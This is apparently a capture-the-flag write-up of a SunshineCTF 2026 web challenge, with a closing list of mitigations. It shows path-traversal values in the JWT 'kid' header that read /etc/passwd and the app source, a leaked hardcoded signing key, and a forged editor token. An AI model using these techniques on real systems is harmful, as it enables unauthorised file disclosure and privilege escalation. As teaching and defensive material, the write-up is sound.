# You Are Kidding Me — SunshineCTF 2026 (web, 500 pts)

**Flag:** `sun{h0tw1r3d_4dm1n_jwt}`

## Challenge summary

> "Ever wanted to read up on the cars of the future? We got a blog for that!"
> Category hint: `jex` — a misdirection; the real bug is the JWT `kid` header
> (hence the name). It's a Flask app, not Java.

Service: `https://kidding.web.2026.sunshinectf.games/`

## Recon

- `POST /login` (form field `name`) issues a free **reader pass**: a JWT cookie,
  header `{"alg":"HS256","kid":"reader.key"}`, claims `{"sub":name,"role":"reader"}`.
- `/admin` (the "Editor's Desk") requires `role == "editor"` and shows the
  embargoed drafts plus the flag.

## Step 1: `kid` is a filename — path traversal in the key lookup

Crafting a JWT with an arbitrary `kid` and a garbage signature makes `/admin`
return verbose errors, because it resolves the HMAC verification key as
`/app/keys/<kid>`:

```
KEY LOAD FAILED :: [Errno 2] No such file or directory: '/app/keys/pwned123'
Pass declared key file: pwned123
```

No sanitization → `kid=../../etc/passwd` loads `/etc/passwd` as the HMAC key
("PASS REJECTED :: Signature verification failed" instead of the file error —
a file-existence oracle).

## Step 2: verbose error handler dumps non-"protected" files

On signature failure the app runs a "Pass Inspector · Prototype Debug" routine
that **prints the contents of the key file it loaded**, unless the file is in a
`PROTECTED_FILES` set. Probing shows `/etc/passwd`, `/etc/hostname`, and
crucially **`/app/app.py` are NOT protected** — only the two key files and
`flag.txt` are. So:

```
kid=../app.py  →  the full application source is dumped into the 401 page
```

## Step 3: hardcoded editor key in the source

The dumped source (`app.py`) contains:

```python
EDITOR_KEY = b'ch-pr0t0type-edit0r-s1gn1ng-k3y-d0-n0t-sh1p'
```

and the protected set, confirming why `flag.txt` and the key files were
"withheld" while everything else was disclosed:

```python
PROTECTED_FILES = frozenset(
    [os.path.realpath(os.path.join(KEYS_DIR, name))
     for name in ('reader.key', 'editor.key')]
    + [os.path.realpath(FLAG_PATH)]
)
```

## Step 4: forge an editor pass

Sign our own token with the leaked key and the matching `kid`:

```json
header:  {"alg":"HS256","kid":"editor.key","typ":"JWT"}
claims:  {"sub":"editor-in-chief","role":"editor"}
key:     ch-pr0t0type-edit0r-s1gn1ng-k3y-d0-n0t-sh1p  (HS256)
```

`GET /admin` with that cookie → HTTP 200, embargoed drafts rendered, and the
flag in the page:

```
sun{h0tw1r3d_4dm1n_jwt}
```

## Attack chain

verbose key-load error reveals `kid` → file read → **full source disclosure**
via the unprotected `/app/app.py` → hardcoded `EDITOR_KEY` → self-signed
`role=editor` JWT → flag.

## Notes

- The backend 502s seen while probing are a single-worker Flask app
  crashing/restarting; retries after ~10 s recover.
- The `jex` category is a red herring: the sink is JWT `kid` handling, not a
  JEXL expression evaluator.

## Mitigations

- Never resolve key material from a client-controlled `kid` string; use a
  fixed allow-list mapping `kid → key` with no path semantics.
- Don't enable verbose debug disclosures (file contents, stack traces) in
  production error paths.
- Never hardcode signing keys in source — load from a secrets manager
  (the code even has `TODO(launch): these belong in the key vault`).
- The reader key is randomly generated per boot (`secrets.token_hex(32)`) but
  written to disk under a predictable name — same fixed-`kid` problem.
